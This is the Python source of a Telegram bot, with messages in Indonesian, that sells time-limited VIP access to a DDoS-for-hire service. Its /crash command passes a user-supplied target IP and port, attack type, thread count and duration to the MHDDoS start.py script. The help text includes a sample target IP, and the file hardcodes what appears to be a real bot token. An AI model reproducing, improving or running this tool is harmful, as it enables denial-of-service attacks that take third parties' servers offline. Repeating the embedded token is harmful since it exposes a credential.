import telebot
import subprocess
import sqlite3
from datetime import datetime, timedelta
from threading import Lock
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "7874705308:AAGEeOTipFJMjq9JwBod16jZ1rE0xELukOQ"
ADMIN_ID = 6320028017
START_PY_PATH = "/workspaces/MHDDoS/start.py"

bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}

conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute(
    """
    CREATE TABLE IF NOT EXISTS vip_users (
        id INTEGER PRIMARY KEY,
        telegram_id INTEGER UNIQUE,
        expiration_date TEXT
    )
    """
)
conn.commit()


@bot.message_handler(commands=["start"])
def handle_start(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()


    if result:
        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            vip_status = "❌ *𝘙𝘦𝘯𝘤𝘢𝘯𝘢 𝘝𝘐𝘗 𝘈𝘯𝘥𝘢 𝘛𝘦𝘭𝘢𝘩 𝘒𝘢𝘥𝘢𝘭𝘶𝘢𝘳𝘴𝘢.*"
        else:
            dias_restantes = (expiration_date - datetime.now()).days
            vip_status = (
                f"✅ 𝙋𝙀𝙇𝘼𝙉𝙂𝙂𝘼𝙉 𝙑𝙄𝙋!\n"
                f"⏳ 𝘏𝘢𝘳𝘪 𝘠𝘢𝘯𝘨 𝘛𝘦𝘳𝘴𝘪𝘴𝘢: {dias_restantes} dia(s)\n"
                f"📅 𝘏𝘢𝘣𝘪𝘴 𝘔𝘢𝘴𝘢 𝘉𝘦𝘳𝘭𝘢𝘬𝘶: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
            )
    else:
        vip_status = "❌ *𝘼𝙉𝘿𝘼 𝙏𝙄𝘿𝘼𝙆 𝙈𝙀𝙈𝙄𝙇𝙄𝙆𝙄 𝙋𝘼𝙆𝙀𝙏 𝙑𝙄𝙋 𝘼𝙆𝙏𝙄𝙁. 𝘏𝘶𝘣𝘶𝘯𝘨𝘪 @Danssrmdn 𝘜𝘯𝘵𝘶𝘬 𝘔𝘦𝘯𝘨𝘈𝘬𝘵𝘪𝘧𝘬𝘢𝘯.*"
    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="🌐 DANSS RMDN OWNER VVIP 🌐",
        url=f"tg://user?id={ADMIN_ID}"

    )
    markup.add(button)
    
    bot.reply_to(
        message,
        (
            "🤖 *𝘿𝘿𝙊𝙎 𝙎𝙀𝙍𝙑𝙀𝙍 𝙎𝙄𝙂𝙉𝘼𝙇 999+!*"
            

            f"""
```
{vip_status}```\n"""
            "📌 *𝘊𝘢𝘳𝘢 𝘔𝘦𝘯𝘨𝘨𝘶𝘯𝘢𝘬𝘢𝘯:*"
            """
```
/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n"""
            "💡 *𝘊𝘖𝘕𝘛𝘖𝘏:*"
            """
```
/crash UDP 143.92.125.230:10013 10 900```\n"""
            "☛ @Danssrmdn Pengguna Vvip ☚"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.message_handler(commands=["vip"])
def handle_addvip(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ 𝘼𝙉𝘿𝘼 𝘽𝙐𝙆𝘼𝙉 𝙊𝙒𝙉𝙀𝙍 𝙍𝙀𝙎𝙈𝙄, 𝙃𝙖𝙝𝙖𝙃𝙖 𝙇𝙖𝙬𝙖𝙠 𝙇𝙤🗿😂.")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(
            message,
            "❌ 𝙁𝙊𝙍𝙈𝘼𝙏 𝙏𝙄𝘿𝘼𝙆 𝙑𝘼𝙇𝙄𝘿. 𝙂𝙐𝙉𝘼𝙆𝘼𝙉: `/vip <𝘐𝘋> <𝘑𝘜𝘔𝘓𝘈𝘏 𝘏𝘈𝘙𝘐>`",
            parse_mode="Markdown",
        )
        return

    telegram_id = args[1]
    days = int(args[2])
    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    with db_lock:
        cursor.execute(
            """
            INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
            VALUES (?, ?)
            """,
            (telegram_id, expiration_date),
        )
        conn.commit()

    bot.reply_to(message, f"✅ 𝙋𝙚𝙣𝙜𝙜𝙪𝙣𝙖 {telegram_id} 𝙙𝙞 𝙏𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣 𝙎𝙚𝙗𝙖𝙜𝙖𝙞 𝙑𝙄𝙋 𝙎𝙚𝙡𝙖𝙢𝙖 {days} 𝙃𝙖𝙧𝙞.")


@bot.message_handler(commands=["crash"])
def handle_ping(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if not result:
        bot.reply_to(message, "❌ 𝙇𝙐 𝙎𝙄𝘼𝙋𝘼 𝘼𝙉𝙅!?😂.𝘈𝘯𝘥𝘢 𝘛𝘪𝘥𝘢𝘬 𝘔𝘦𝘮𝘪𝘭𝘪𝘬𝘪 𝘐𝘫𝘪𝘯 𝘔𝘦𝘯𝘨𝘨𝘶𝘯𝘢𝘬𝘢𝘯 𝘗𝘦𝘳𝘪𝘯𝘵𝘢𝘩 𝘐𝘯𝘪, 𝘚𝘪𝘭𝘢𝘩𝘬𝘢𝘯 𝘏𝘶𝘣𝘶𝘯𝘨𝘪 @Danssrmdn.")
        return

    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration_date:
        bot.reply_to(message, "❌ 𝘼𝙆𝙎𝙀𝙎 𝙑𝙄𝙋 𝘼𝙉𝘿𝘼 𝙏𝙀𝙇𝘼𝙃 𝙆𝘼𝘿𝘼𝙇𝙐𝘼𝙍𝙎𝘼 𝘾𝙊𝙆𝙆🗿. 𝘐𝘯𝘨𝘪𝘯 𝘔𝘦𝘯𝘥𝘢𝘱𝘢𝘵𝘬𝘢𝘯 𝘈𝘬𝘴𝘦𝘴 𝘝𝘪𝘱 𝘓𝘢𝘨𝘪? Hubungi @Danssrmdn.")
        return

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 10:
        bot.reply_to(message, "❌ 𝙏𝙪𝙣𝙜𝙜𝙪 10 𝘿𝙚𝙩𝙞𝙠 𝙎𝙚𝙗𝙚𝙡𝙪𝙢 𝙈𝙚𝙢𝙪𝙡𝙖𝙞 𝙎𝙚𝙧𝙖𝙣𝙜𝙖𝙣 𝙇𝙖𝙞𝙣 𝙙𝙖𝙣 𝙄𝙣𝙜𝙖𝙩𝙡𝙖𝙝 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙣𝙜𝙝𝙚𝙣𝙩𝙞𝙠𝙖𝙣 𝙎𝙚𝙧𝙖𝙣𝙜𝙖𝙣 𝙎𝙚𝙗𝙚𝙡𝙪𝙢𝙣𝙮𝙖.")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "❌ *𝙁𝙊𝙍𝙈𝘼𝙏 𝙎𝘼𝙇𝘼𝙃 𝙉𝙅𝙄𝙉𝙆😂!*\n\n"
                "📌 *𝘗𝘦𝘯𝘨𝘨𝘶𝘯𝘢𝘢𝘯 𝘠𝘢𝘯𝘨 𝘉𝘦𝘯𝘢𝘳:*\n"
                "`/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
                "💡 *𝘊𝘖𝘕𝘛𝘖𝘏:*\n"
                "`/crash UDP 143.92.125.230:10013 10 900`"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = args[3]
    duration = args[4]
    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    active_attacks[telegram_id] = process
    cooldowns[telegram_id] = time.time()

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⛔ HENTIKAN SERANGAN ASUI🗿", callback_data=f"stop_{telegram_id}"))

    bot.reply_to(
        message,
        (
            "*[✅] 𝙎𝙀𝙍𝘼𝙉𝙂𝘼𝙉 𝙙𝙞 𝙈𝙐𝙇𝘼𝙄 - 200 [✅]*\n\n"
            f"🌐 *𝘈𝘭𝘢𝘮𝘢𝘵:* {ip_port}\n"
            f"⚙️ *𝘛𝘪𝘱𝘦:* {attack_type}\n"
            f"🧟‍♀️ *𝘛𝘩𝘳𝘦𝘢𝘥𝘴:* {threads}\n"
            f"⏳ *𝘋𝘶𝘳𝘢𝘴𝘪 (ms):* {duration}\n\n"
            f"☛ @Danssrmdn Pengguna Vvip ☚"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(
            call.id, "❌ 𝘏𝘢𝘯𝘺𝘢 𝘗𝘦𝘯𝘨𝘨𝘶𝘯𝘢 𝘠𝘢𝘯𝘨 𝘉𝘪𝘴𝘢 𝘔𝘦𝘭𝘢𝘬𝘶𝘬𝘢𝘯𝘯𝘺𝘢"
        )
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        bot.answer_callback_query(call.id, "✅ 𝘚𝘦𝘳𝘢𝘯𝘨𝘢𝘯 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘋𝘪 𝘏𝘦𝘯𝘵𝘪𝘬𝘢𝘯.")
        bot.edit_message_text(
            "*[⛔] SERANGAN SELESAI[⛔]*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "❌ Tidak Ada Serangan Yang Di Temukan, Lanjutkan Tindakan Anda.")

if __name__ == "__main__":
    bot.infinity_polling()
